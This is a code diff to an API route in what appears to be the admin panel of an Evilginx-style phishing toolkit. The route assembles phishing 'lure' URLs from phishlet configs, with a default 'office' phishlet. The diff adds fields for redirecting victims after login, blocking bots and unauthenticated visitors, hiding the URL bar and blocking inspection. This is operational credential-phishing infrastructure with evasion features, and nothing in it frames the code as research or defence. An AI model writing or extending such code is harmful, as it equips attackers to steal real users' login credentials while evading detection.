@@ -23,10 +23,75 @@ export default async function handler(
     // Check if a specific lure index was requested
     const { lureIndex } = req.query;
 
-    // Get the link info, specifying lure index if provided
-    const linkInfo = await configService.getFullLink(
-      lureIndex !== undefined ? Number(lureIndex) : undefined
+    // Convert lureIndex to a number if it exists
+    const lureIndexNum =
+      lureIndex !== undefined ? Number(lureIndex) : undefined;
+
+    console.log(
+      `API /full-link: Requesting data for lure index ${lureIndexNum}`
     );
+
+    // Get the link info, specifying lure index if provided
+    let linkInfo;
+
+    // If we're requesting a specific index, get that specific lure
+    if (lureIndexNum !== undefined) {
+      const config = await configService.readConfig();
+      if (
+        config &&
+        config.lures &&
+        Array.isArray(config.lures) &&
+        lureIndexNum >= 0 &&
+        lureIndexNum < config.lures.length
+      ) {
+        const lure = config.lures[lureIndexNum];
+
+        // We have the specific lure, now get its full link info
+        const general = config.general || {};
+        const domain = general.domain || "";
+        const path = lure.path || "";
+        const phishlet = lure.phishlet || "office"; // Default to office if not specified
+
+        // Get the phishlet configuration
+        const phishletConfig = config.phishlets?.[phishlet] || {};
+
+        // Use the hostname from the phishlet config or construct it
+        let hostname = phishletConfig.hostname || "";
+        if (!hostname && domain) {
+          hostname = `${phishlet}.${domain}`;
+        }
+
+        const fullUrl = hostname ? `https://${hostname}${path}` : "";
+
+        linkInfo = {
+          fullUrl,
+          domain,
+          path: path.replace(/^\/+/, ""), // Remove leading slash for display
+          phishlet,
+          afterLoginRedirect: lure.redirect_url || "",
+          blockBots: config.blacklist?.mode === "unauth",
+          redirectUrl: general.unauth_url || "",
+          hideUrlBar: true, // Default security settings
+          blockInspect: true,
+          redirectGuard: true,
+        };
+
+        console.log(`API /full-link: Found lure at index ${lureIndexNum}:`, {
+          path: lure.path,
+          phishlet: lure.phishlet,
+        });
+      } else {
+        console.log(`API /full-link: No lure found at index ${lureIndexNum}`);
+        linkInfo = null;
+      }
+    } else {
+      // Backward compatibility with lureId parameter
+      const { lureId } = req.query;
+      console.log(`API /full-link: Falling back to lureId ${lureId}`);
+      linkInfo = await configService.getFullLink(
+        typeof lureId === "string" ? lureId : undefined
+      );
+    }
 
     if (!linkInfo) {
       return res.status(200).json({
@@ -63,6 +128,9 @@ export default async function handler(
           const index = Number(lureIndex);
           if (!isNaN(index) && index >= 0 && index < config.lures.length) {
             selectedLure = config.lures[index];
+            console.log(
+              `API /full-link fallback: Using lure at index ${index}`
+            );
           }
         }
 
@@ -88,6 +156,9 @@ export default async function handler(
           domain,
           path: path.replace(/^\/+/, ""), // Remove leading slash for display
           phishlet,
+          afterLoginRedirect: lure.redirect_url || "",
+          blockBots: config.blacklist?.mode === "unauth",
+          redirectUrl: config.general?.unauth_url || "",
         });
       }
 
